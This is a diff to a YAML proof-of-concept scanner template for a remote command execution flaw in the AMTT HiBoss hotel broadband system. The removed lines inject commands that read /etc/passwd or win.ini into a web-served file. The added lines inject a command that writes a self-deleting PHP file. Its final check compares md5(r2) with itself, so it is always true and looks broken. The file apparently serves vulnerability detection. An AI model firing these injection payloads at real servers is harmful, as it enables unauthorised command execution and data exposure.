@@ -1,25 +1,16 @@
 name: poc-yaml-amtt-hiboss-rce
 set:
   r2: randomLowercase(10)
-groups:
-  linux:
-    - method: GET
-      path: /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../{{r2}}.txt&id=1
-      expression: |
-        response.status == 200 && response.content_type.contains("text/html") && response.body.bcontains(b"parent.doTestResult")
-    - method: GET
-      path: /{{r2}}.txt
-      expression: |
-        response.status == 200 && response.content_type.contains("text/plain") && r'root:[x*]:0:0:'.bmatches(response.body)
-  win:
-    - method: GET
-      path: /manager/radius/server_ping.php?ip=127.0.0.1|cat%20c:/windows/win.ini>../../{{r2}}.txt&id=1
-      expression: |
-        response.status == 200 && response.content_type.contains("text/html") && response.body.bcontains(b"parent.doTestResult")
-    - method: GET
-      path: /{{r2}}.txt
-      expression: |
-        response.status == 200 && response.content_type.contains("text/plain") && response.body.bcontains(b"for 16-bit app support")
+rules:
+  - method: GET
+    path: /manager/radius/server_ping.php?ip=127.0.0.1|echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>">../../{{r2}}.php&id=1
+    expression: |
+      response.status == 200 && response.content_type.contains("text/html") && response.body.bcontains(b"parent.doTestResult")
+  - method: GET
+    path: /{{r2}}.php
+    expression: |
+      response.status == 200 && md5(r2).contains(md5(r2))
+
 detail:
   author: YekkoY
   description: "安美数字-酒店宽带运营系统-远程命令执行漏洞"
